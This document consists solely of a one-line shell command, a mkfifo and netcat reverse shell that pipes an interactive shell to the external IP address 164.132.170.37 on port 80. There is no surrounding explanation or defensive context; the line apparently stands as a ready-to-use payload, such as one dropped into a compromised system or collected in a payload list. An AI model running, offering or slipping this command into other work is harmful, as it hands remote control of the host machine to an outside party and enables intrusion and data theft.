rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 164.132.170.37 80 >/tmp/f
